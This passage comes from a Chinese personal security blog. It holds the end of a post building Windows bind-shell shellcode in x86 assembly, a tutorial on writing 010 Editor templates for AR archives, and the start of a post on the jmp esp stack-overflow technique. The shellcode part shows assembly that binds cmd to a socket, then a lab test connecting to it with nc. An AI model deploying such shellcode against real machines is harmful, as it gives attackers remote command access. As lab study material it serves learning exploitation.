  WORD cbReserved2;        <span class="comment">//ä¿ç•™ã€‚å¿…é¡»è¢«åˆå§‹åŒ–ä¸º0</span></span><br><span class="line">   PBYTE lpReserved2;       <span class="comment">//ä¿ç•™ã€‚å¿…é¡»è¢«åˆå§‹åŒ–ä¸ºN U L L</span></span><br><span class="line">   HANDLE hStdInput;        <span class="comment">//ç”¨äºè®¾å®šä¾›æ§åˆ¶å°è¾“å…¥å’Œè¾“å‡ºç”¨çš„ç¼“å­˜çš„å¥æŸ„ã€‚</span></span><br><span class="line">                            <span class="comment">//æŒ‰ç…§é»˜è®¤è®¾ç½®ï¼Œh S t d I n p u t ç”¨äºæ ‡è¯†é”®ç›˜ç¼“å­˜ï¼Œ</span></span><br><span class="line">                           <span class="comment">// h S t d O u t p u t å’Œh S t d E r r o rç”¨äºæ ‡è¯†æ§åˆ¶å°çª—å£çš„ç¼“å­˜</span></span><br><span class="line">   HANDLE hStdOutput;</span><br><span class="line">   HANDLE hStdError;</span><br><span class="line">&#125; STARTUPINFO, *LPSTARTUPINFO;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="åˆå§‹åŒ–STARTUPINFOç»“æ„ä½“"><a href="#åˆå§‹åŒ–STARTUPINFOç»“æ„ä½“" class="headerlink" title="åˆå§‹åŒ–STARTUPINFOç»“æ„ä½“"></a>åˆå§‹åŒ–STARTUPINFOç»“æ„ä½“</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; initialise a STARTUPINFO structure at esp </span><br><span class="line">	inc byte ptr [esp + 0x2d] 	; set STARTF_USESTDHANDLES to true </span><br><span class="line">	sub edi, 0x6c 				; point edi at hStdInput in STARTUPINFO </span><br><span class="line">	stosd 					; use SOCKET descriptor returned by accept </span><br><span class="line">							; (still in eax) as the stdin handle </span><br><span class="line">	stosd 					; same for stdout </span><br><span class="line">	stosd					; same for stderr (optional) </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œediå’Œespå·²ç»ç¦»å¾—å¾ˆè¿‘äº†,åœ¨sub edi,0x6cä¹‹å‰</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918202314459.png" alt="image-20220918202314459"></p>
<p>ä¹‹å</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918202330635.png" alt="image-20220918202330635"></p>
<p>ç„¶ååœ¨ediçš„æœ€åä¸‰ä¸ªåŒå­—ä¸Š(stdinput,stdout,stderr)éƒ½è®¾ç½®ä¸ºeaxä¸­çš„å¥—æ¥å­—æè¿°ç¬¦</p>
<p>å‰©ä½™çš„å­—èŠ‚éƒ½æ˜¯0</p>
<h3 id="CreateProcessA"><a href="#CreateProcessA" class="headerlink" title="CreateProcessA"></a>CreateProcessA</h3><p>æ ˆé¡¶ä½ç½®è¿˜å•¥ä¹Ÿæ²¡å†™,æ¨ç»™eaxå½“0ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; create process </span><br><span class="line">	pop eax 			; set eax = 0 (STARTUPINFO now at esp + 4) </span><br><span class="line">	push esp			; use stack as PROCESSINFORMATION structure </span><br><span class="line">	; (STARTUPINFO now back to esp) </span><br><span class="line">	push esp 			; STARTUPINFO structure </span><br><span class="line">	push eax 		; lpCurrentDirectory = NULL </span><br><span class="line">	push eax 		; lpEnvironment = NULL </span><br><span class="line">	push eax 		; dwCreationFlags = NULL </span><br><span class="line">	push esp 			; bInheritHandles = true </span><br><span class="line">	push eax 		; lpThreadAttributes = NULL </span><br><span class="line">	push eax 		; lpProcessAttributes = NULL </span><br><span class="line">	push esi 			; lpCommandLine = &quot;cmd&quot; </span><br><span class="line">	push eax 		; lpApplicationName = NULL </span><br><span class="line">	call [esi - 0x1c] 	; CreateProcessA </span><br></pre></td></tr></table></figure>

<p>è¿™å°±åˆ›å»ºäº†ä¸€ä¸ªcmdè¿›ç¨‹,å…¶ä¸‰æ ‡éƒ½é‡å®šå‘åˆ°å¥—æ¥å­—äº†</p>
<h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>windows XPé¶æœºå’Œwin10ä¸»æœºé‡‡ç”¨NATè¿æ¥æ–¹å¼,XPé¶æœºçš„ipåœ°å€ä¸º192.168.191.137</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918203112083.png" alt="é¶æœºåœ°å€"></p>
<p>åœ¨ä¸»æœºä¸Š<code>nc 192.168.191.137 6666</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918203216136.png" alt="é€šäº†"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/17/010editor%20%E6%A8%A1%E6%9D%BF%E7%BC%96%E5%86%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/17/010editor%20%E6%A8%A1%E6%9D%BF%E7%BC%96%E5%86%99/" class="post-title-link" itemprop="url">010editor æ¨¡æ¿è¯­æ³•</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-09-17 23:55:00 / Modified: 23:56:55" itemprop="dateCreated datePublished" datetime="2022-09-17T23:55:00+08:00">2022-09-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="010editor-æ¨¡æ¿ç¼–å†™"><a href="#010editor-æ¨¡æ¿ç¼–å†™" class="headerlink" title="010editor æ¨¡æ¿ç¼–å†™"></a>010editor æ¨¡æ¿ç¼–å†™</h1><p>ä»¥linuxä¸Šçš„å½’æ¡£æ–‡ä»¶AR,æˆ–è€…è¯´windowsä¸Šçš„é™æ€åº“LIBä¸ºä¾‹çœ‹çœ‹æ¨¡æ¿æ˜¯å’‹å†™çš„</p>
<p>æ€»çš„æ¥è¯´,å†™010editoræ¨¡æ¿å°±æ˜¯å®šä¹‰ç»“æ„ä½“.</p>
<h2 id="ARç»“æ„"><a href="#ARç»“æ„" class="headerlink" title="ARç»“æ„"></a>ARç»“æ„</h2><p>éœ€è¦ç»“åˆARæ–‡ä»¶çš„ç»“æ„,ç†è§£ARæ¨¡æ¿</p>
<p><a target="_blank" rel="noopener" href="https://dustball.top/2022/08/19/lib%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90/">ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…» chapter 9 LIB | Deutschballâ€™s blog (dustball.top)</a></p>
<p>ARæ–‡ä»¶ç”±ä¸€ä¸ªç­¾åé­”æ•°<code>!&lt;arch&gt;\n</code>è¿˜æœ‰å¤šä¸ªobjæ¨¡å—ç»„æˆ,</p>
<p>æ¯ä¸ªobjæ¨¡å—ä¹‹å‰éƒ½ä¼šæœ‰ä¸€ä¸ªå¤´,ä½œç”¨æ˜¯æè¿°è¯¥objæ¨¡å—çš„ä¿¡æ¯</p>
<p>è¿™ä¸ªå¤´çš„å®šä¹‰å¤§æ¦‚æ˜¯è¿™æ ·çš„,å­—èŠ‚æ•°æ˜¯å¯¹çš„,ä½†æ˜¯å˜é‡åå«å•¥æ— æ‰€è°“</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>    fileName[<span class="number">16</span>];<span class="comment">//æ–‡ä»¶å</span></span><br><span class="line">    <span class="type">char</span>    modification_timestamp[<span class="number">12</span>];<span class="comment">//æœ€åä¿®æ”¹æ—¶é—´æˆ³</span></span><br><span class="line">    <span class="type">char</span>    ownerID[<span class="number">6</span>];<span class="comment">//æ‹¥æœ‰è€…ID</span></span><br><span class="line">    <span class="type">char</span>    groupID[<span class="number">6</span>];<span class="comment">//ç»„ID</span></span><br><span class="line">    <span class="type">char</span>    fileMode[<span class="number">8</span>];<span class="comment">//æ–‡ä»¶æ¨¡å¼</span></span><br><span class="line">    <span class="type">char</span>    fileSize[<span class="number">10</span>];<span class="comment">//æ–‡ä»¶å¤§å°</span></span><br><span class="line">    <span class="type">char</span>    endMarker[<span class="number">2</span>];<span class="comment">//æœ¬å¤´ç»“æŸç¬¦</span></span><br><span class="line">&#125; OBJ_HEADER;</span><br></pre></td></tr></table></figure>

<p>åé¢ç´§è·Ÿç€å°±æ˜¯objæ¨¡å—æ­£æ–‡äº†</p>
<p>å¦‚æœobjæ¨¡å—çš„å¤§å°æ˜¯ä¸€ä¸ªå¥‡æ•°,åˆ™åé¢å†å¡«å……ä¸€ä¸ªå­—èŠ‚</p>
<p>è¿™å°±æ˜¯ä¸€ä¸ªobjæ¨¡å—åœ¨ARæ–‡ä»¶ä¸­çš„çŠ¶æ€</p>
<h2 id="ARæ¨¡æ¿"><a href="#ARæ¨¡æ¿" class="headerlink" title="ARæ¨¡æ¿"></a>ARæ¨¡æ¿</h2><h3 id="ç»“æ„å®šä¹‰"><a href="#ç»“æ„å®šä¹‰" class="headerlink" title="ç»“æ„å®šä¹‰"></a>ç»“æ„å®šä¹‰</h3><p>AR æ¨¡æ¿çš„ä¸»ä½“å°±æ˜¯è¿™ä¹ˆä¸€ä¸ªar_flieç»“æ„ä½“,æˆå‘˜ä»–éƒ½æœ‰,åˆé™„åŠ äº†ä¸€äº›é¢å¤–çš„å‡½æ•°ç­‰ç­‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="comment">// Define header</span></span><br><span class="line">    SetBackColor( cLtYellow );<span class="comment">//ä»è¿™é‡Œå¼€å§‹çš„æ•°æ®è¢«é«˜äº®ä¸ºäº®é»„è‰²</span></span><br><span class="line">    <span class="type">char</span>    fileName[<span class="number">16</span>];<span class="comment">//æ–‡ä»¶å,æ²¡æœ‰localä¿®é¥°,ä¼šæ˜¾ç¤º</span></span><br><span class="line">    <span class="type">char</span>    modification_timestamp[<span class="number">12</span>];</span><br><span class="line">    <span class="type">char</span>    ownerID[<span class="number">6</span>];</span><br><span class="line">    <span class="type">char</span>    groupID[<span class="number">6</span>];</span><br><span class="line">    <span class="type">char</span>    fileMode[<span class="number">8</span>];</span><br><span class="line">    <span class="type">char</span>    fileSize[<span class="number">10</span>];</span><br><span class="line">    <span class="type">char</span>    endMarker[<span class="number">2</span>];</span><br><span class="line">    SetBackColor( cNone );<span class="comment">//å–æ¶ˆé«˜äº®</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Define file data</span></span><br><span class="line">    <span class="keyword">if</span>( endMarker == <span class="string">&quot;\x60\x0a&quot;</span> )<span class="comment">//å¦‚æœendMarker==&#x27;\0x60\0x0a&#x27;è¯´æ˜éƒ½å¯¹é½äº†,æ²¡æœ‰å·®é”™</span></span><br><span class="line">    &#123;</span><br><span class="line">        local int64 size;<span class="comment">//localå˜é‡ä¸ä¼šæ˜¾ç¤º,åªæ˜¯è®¡ç®—ä½¿ç”¨</span></span><br><span class="line">        SScanf( fileSize, <span class="string">&quot;%Ld&quot;</span>, size );<span class="comment">//010editor API,å°†fileSizeè½¬åŒ–æˆé•¿æ•´å‹,æ”¾åˆ°æ ¼å¼åŒ–å‚æ•°sizeä¸Š</span></span><br><span class="line">        <span class="keyword">if</span>( size &gt; <span class="number">0</span> )<span class="comment">//å¦‚æœsize&gt;0è¯´æ˜æœ¬å¤´æ˜¯æœ‰å¯¹åº”objæ¨¡å—çš„,objæ¨¡å—çš„å¤§å°å·²ç»åœ¨filesizeä¸­ç»™å‡ºäº†</span></span><br><span class="line">            uchar data[size];<span class="comment">//æ­¤å¤„å®šä¹‰çš„uchar data[size]æ²¡æœ‰ç”¨localä¿®é¥°,æ˜¯ä¼šæ˜¾ç¤ºçš„,sizeä¼šæ˜¾ç¤ºå‡ºå˜é‡å€¼</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Add padding byte</span></span><br><span class="line">        <span class="keyword">if</span>( size &amp; <span class="number">1</span> )<span class="comment">//å¦‚æœsizeæ–‡ä»¶å¤§å°æ˜¯ä¸ªå¥‡æ•°åˆ™æœ€åå¡«å……ä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line">            uchar padding &lt;bgcolor=cLtGray&gt;;<span class="comment">//è¯¥å¡«å……å­—èŠ‚ä½¿ç”¨äº®ç°è‰²é«˜äº®</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; ar_file &lt;read=ReadArFile&gt;;<span class="comment">//è¯»å›è°ƒå‡½æ•°å£°æ˜ä¸ºReadArFile</span></span><br><span class="line"><span class="comment">// Display filename beside ar_file struct</span></span><br><span class="line"><span class="built_in">string</span> <span class="title function_">ReadArFile</span><span class="params">( <span class="keyword">struct</span> ar_file &amp;f )</span><span class="comment">//è¯»å›è°ƒå‡½æ•°</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> f.fileName + <span class="string">&quot; size=&quot;</span> + f.fileSize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>è¯»å›è°ƒå‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªstringå­—ç¬¦ä¸²,å°†ä¼šæ˜¾ç¤ºåœ¨Valueæ </p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917231952934.png" alt="image-20220917231952934"></p>
<h3 id="æ§åˆ¶æµ"><a href="#æ§åˆ¶æµ" class="headerlink" title="æ§åˆ¶æµ"></a>æ§åˆ¶æµ</h3><p>ä¸Šè¿°<code>typedef struct ar_file</code>å’ŒReadArFileéƒ½åªæ˜¯å®šä¹‰,è¿™ä¸€ç‚¹å’ŒCè¯­è¨€ç›¸åŒ,å¹¶æ²¡æœ‰å®ä¾‹åŒ–ar_fileç»“æ„ä½“çš„å¯¹è±¡,ä¹Ÿæ²¡æœ‰è°ƒç”¨ReadArFileå‡½æ•°,ä¸‹é¢æ‰å¼€å§‹æ§åˆ¶æµ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Read the file signature</span></span><br><span class="line"><span class="type">char</span> signature[<span class="number">8</span>] &lt;bgcolor=cLtPurple&gt;;<span class="comment">//é¦–å…ˆå®šä¹‰8ä¸ªå­—èŠ‚ç”¨æ¥æ‰¿è½½æ–‡ä»¶é­”æ•°,äº®ç´«è‰²é«˜äº®</span></span><br><span class="line"><span class="keyword">if</span>( signature != <span class="string">&quot;!&lt;arch&gt;\n&quot;</span> )<span class="comment">//åˆ¤æ–­é­”æ•°æ˜¯å¦æ˜¯ARçš„é­”æ•°,å¦‚æœä¸æ˜¯åˆ™è¿”å›-1è¡¨æ˜æ¨¡æ¿é”™è¯¯</span></span><br><span class="line">&#123;</span><br><span class="line">    Warning( <span class="string">&quot;File is not a valid archive. Template stopped.&quot;</span> );<span class="comment">//APIå‡½æ•°,å‘å‡ºè­¦å‘Š</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read file records</span></span><br><span class="line"><span class="keyword">while</span>( !FEof() )<span class="comment">//FEofä¸º010editor API,ç”¨äºæ£€æŸ¥å½“å‰æ–‡ä»¶æŒ‡é’ˆæ˜¯å¦åˆ°è¾¾æ–‡ä»¶æœ«å°¾</span></span><br><span class="line">&#123;</span><br><span class="line">    ar_file file;<span class="comment">//å¦‚æœæ–‡ä»¶æŒ‡é’ˆæ²¡æœ‰åˆ°è¾¾æœ«å°¾,è¯´æ˜è¿˜æœ‰objæ¨¡å—çš„ä¿¡æ¯æ²¡æœ‰åˆ†æ,æ¯æ¬¡è¯»å…¥å¡«å……ä¸€ä¸ªar_file,ç›´åˆ°å…¨éƒ½è¯»å–å®Œæ¯•</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ¯ä¸ªobjæ¨¡å—çš„æ­£æ–‡é•¿åº¦éƒ½æ˜¯ä¸ä¸€æ ·çš„,ä½†æ˜¯è¯»å–çš„æ—¶å€™éƒ½æ˜¯åˆ›å»ºar_file,æ€ä¹ˆä½“ç°å¯¹äºä¸åŒæ¨¡å—çš„åŒºåˆ«å¯¹å¾…å‘¢?</p>
<p>å·²ç»åŒ…å«åœ¨ar_fileç»“æ„ä½“çš„å®šä¹‰ä¸­äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( size &gt; <span class="number">0</span> )<span class="comment">//å¦‚æœsize&gt;0è¯´æ˜æœ¬å¤´æ˜¯æœ‰å¯¹åº”objæ¨¡å—çš„,objæ¨¡å—çš„å¤§å°å·²ç»åœ¨filesizeä¸­ç»™å‡ºäº†</span></span><br><span class="line">           uchar data[size];<span class="comment">//æ­¤å¤„å®šä¹‰çš„uchar data[size]æ²¡æœ‰ç”¨localä¿®é¥°,æ˜¯ä¼šæ˜¾ç¤ºçš„,sizeä¼šæ˜¾ç¤ºå‡ºå˜é‡å€¼</span></span><br></pre></td></tr></table></figure>



<p>ä¸å¾—ä¸è¯´,ä¼˜é›…,çœŸçš„å¤ªä¼˜é›…äº†,010editorå°†å¤æ‚çš„å·¥ä½œç•™ç»™è‡ªå·±</p>
<h2 id="æ¨¡æ¿çš„ç»„æˆ"><a href="#æ¨¡æ¿çš„ç»„æˆ" class="headerlink" title="æ¨¡æ¿çš„ç»„æˆ"></a>æ¨¡æ¿çš„ç»„æˆ</h2><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><p>åªè¦æ˜¯åœ¨æ§åˆ¶æµä¸­åˆ›å»ºçš„å˜é‡,éƒ½åˆ†æˆä¸¤ç§,å¸¦<code>local</code>çš„å’Œä¸å¸¦<code>local</code>çš„</p>
<p>å¸¦<code>local</code>çš„æ˜¯ä¸´æ—¶å˜é‡,ä¸ä¼šæ˜¾ç¤ºåœ¨ç•Œé¢ä¸Š,åªç”¨äºæ‰¿è½½ä¸´æ—¶å˜é‡,æ¯”å¦‚ä½œä¸ºå¾ªç¯å˜é‡æˆ–è€…ä¸­é—´ç»“æœ</p>
<p>åœ¨ARæ¨¡æ¿ä¸­<code>local int size</code>å°±ä½œä¸ºä¸­é—´ç»“æœæ‰¿è½½<code>filesize</code>å­—ç¬¦ä¸²çš„è½¬æ¢å€¼</p>
<p>ä¸å¸¦<code>local</code>çš„å°±æ˜¯ç•Œé¢å˜é‡,ä¼šæ˜¾ç¤ºåœ¨ç•Œé¢ä¸Š.æ¯”å¦‚<code>ar_file file;</code>æ¯”å¦‚<code>char signature[8];</code></p>
<h3 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><p>å°–æ‹¬å·å†…å¯ä»¥é™„åŠ å±æ€§</p>
<p>æ¯”å¦‚<code>uchar padding &lt;bgcolor=cLtGray&gt;;</code>è¿™å°±æŠŠä¸€ä¸ªå­—èŠ‚çš„å¡«å……è®¾ç½®ä¸ºäº®ç°è‰²</p>
<p>æ¯”å¦‚<code>char signature[8] &lt;bgcolor=cLtPurple&gt;;</code>å°±æŠŠé­”æ•°ç­¾åè®¾ç½®ä¸ºäº®ç´«è‰²äº†</p>
<p>åˆå¦‚<code>ar_file &lt;read=ReadArFile&gt;;</code>å°±ç»™æ¯ä¸ª<code>ar_file</code>å¤´éƒ½è®¾ç½®äº†è¯»å›è°ƒå‡½æ•°<code>ReadArFile</code></p>
<p>è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯åœ¨å¤´çš„valueåŸŸä¸Šå†™<code>f.fileName + &quot; size=&quot; + f.fileSize</code></p>
<p>å¸¸ç”¨çš„å±æ€§æœ‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;format=hex|decimal|octal|binary&gt;,<span class="comment">//è®¾ç½®æ•°å­—æ˜¾ç¤ºæ ¼å¼</span></span><br><span class="line">fgcolor=&lt;color&gt;, <span class="comment">//å‰æ™¯è‰²</span></span><br><span class="line">bgcolor=&lt;color&gt;, <span class="comment">//èƒŒæ™¯è‰²</span></span><br><span class="line">comment= <span class="string">&quot;&lt;string&gt;&quot;</span>, <span class="comment">//æ³¨é‡Š</span></span><br><span class="line">open=<span class="literal">true</span>|<span class="literal">false</span>|suppress, <span class="comment">//é»˜è®¤æƒ…å†µä¸‹æ˜¯æŠ˜å è¿˜æ˜¯å±•å¼€</span></span><br><span class="line">hidden=<span class="literal">true</span>|<span class="literal">false</span>, <span class="comment">//</span></span><br><span class="line">read=&lt;function_name&gt;, <span class="comment">//è¯»å›è°ƒå‡½æ•°</span></span><br><span class="line">write=&lt;function_name&gt; <span class="comment">//å†™å›è°ƒå‡½æ•°</span></span><br></pre></td></tr></table></figure>

<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>å‚è€ƒ<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ba60ebd8f916">010Editorè„šæœ¬è¯­æ³•å…¥é—¨ - ç®€ä¹¦ (jianshu.com)</a></p>
<p>æƒ³ç”¨å•¥åŠŸèƒ½å°±å»æŸ¥010editorçš„å•¥å‡½æ•°</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/17/shellcode/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/17/shellcode/" class="post-title-link" itemprop="url">shellcode</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-17 23:55:00" itemprop="dateCreated datePublished" datetime="2022-09-17T23:55:00+08:00">2022-09-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-09-18 20:34:25" itemprop="dateModified" datetime="2022-09-18T20:34:25+08:00">2022-09-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h2 id="jmp-esp"><a href="#jmp-esp" class="headerlink" title="jmp esp"></a>jmp esp</h2><p>åœ¨ç¬¬äºŒç« çš„å®éªŒä¸­,è·³è½¬æ‰§è¡Œå †æ ˆä¸­çš„shellcodeæ—¶,ä½¿ç”¨çš„æ˜¯ç»å¯¹åœ°å€,åªè¦æ˜¯æ¢ä¸ªç³»ç»Ÿ,å¯èƒ½å°±ä¸æ˜¯è¿™ä¸ªåœ°å€äº†.user32åœ¨ä¸åŒçš„å¹³å°ä¸Š,æ˜ åƒåŸºå€ä¹Ÿä¸åŒ,MessageBoxAå‡½æ•°çš„åœ°å€ä¹Ÿä¸åŒ.</p>
<p>ä¹Ÿå°±æ˜¯è¯´ç¬¬äºŒç« çš„ä»£ç åªé€‚ç”¨äºå¾ˆå°èŒƒå›´çš„æ“ä½œç³»ç»Ÿç¯å¢ƒ.ç°åœ¨è¦å¼€å‘è€å°‘é€šåƒçš„shellcodeä»£ç .</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917091036012.png" alt="ç”±äºåŠ¨æ€é“¾æ¥åº“çš„è£…è½½,å‡½æ•°æ ˆå¸§å¯èƒ½æ¯æ¬¡è¿è¡Œéƒ½ä¸åŒ"></p>
<p>ä½†æ˜¯æœ‰ä¸€ç‚¹å¯ä»¥ç¡®å®šçš„æ˜¯,espæ ˆé¡¶æŒ‡é’ˆæ€»ä¼šåœ¨ä¸€ä¸ªå‡½æ•°retnä¹‹å‰é€€å›åˆ°å‡½æ•°ä¸€å¼€å§‹æ—¶çš„çŠ¶æ€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:00401090;å¼€ç«¯</span><br><span class="line">.text:00401090                 push    ebp;è¿™ä¸ªpushå’Œæœ€åçš„popä¹Ÿæ˜¯ç›¸å¯¹åº”çš„</span><br><span class="line">.text:00401091                 mov     ebp, esp</span><br><span class="line">.text:00401093                 sub     esp, 448h;æ‰©å¤§448ä¸ªå­—èŠ‚</span><br><span class="line">....;æ­£æ–‡éƒ¨åˆ†</span><br><span class="line">;å°¾å£°</span><br><span class="line">.text:00401152                 add     esp, 448h;é€€æ ˆ448hä¸ªå­—èŠ‚</span><br><span class="line">.text:00401158                 cmp     ebp, esp</span><br><span class="line">.text:0040115A                 call    __chkesp</span><br><span class="line">.text:0040115F                 mov     esp, ebp</span><br><span class="line">.text:00401161                 pop     ebp</span><br><span class="line">.text:00401162                 retn</span><br><span class="line">.text:00401162 _main_0         endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>

<p>retnä¹‹å,espé€€å›åˆ°è°ƒç”¨ä¹‹å‰çš„çŠ¶æ€,å³è°ƒç”¨è€…å·²ç»å°†å‚æ•°å‹æ ˆå‡†å¤‡å¥½çš„çŠ¶æ€,æ¥ä¸‹æ¥è°ƒç”¨è€…å°±å¾—æ¸…ç†å‚æ•°äº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917092022180.png" alt="image-20220917092022180"></p>
<p>æ ¹æ®è¿™ä¸€ç‚¹,å¯ä»¥å°†shellcodeæº¢å‡ºåˆ°è¢«è°ƒç”¨è€…æ ˆå¸§,è°ƒç”¨è€…ebp,è¿”å›åœ°å€,å‚æ•°,è°ƒç”¨è€…æ ˆå¸§</p>
<p>å…¶ä¸­è¿”å›åœ°å€ä¹‹åçš„(è¢«è°ƒç”¨è€…æ ˆå¸§,è°ƒç”¨è€…ebp)éšä¾¿å¡«å……</p>
<p>è¿”å›åœ°å€å¯ä»¥æ‰¾ä¸€æ¡<code>jmp esp</code>çš„åœ°å€æ”¾ä¸Š</p>
<p>shellcodeå†™åˆ°è¿”å›åœ°å€ä¹‹å‰çš„å‚æ•°,ç”šè‡³è°ƒç”¨è€…æ ˆå¸§é‡Œ</p>
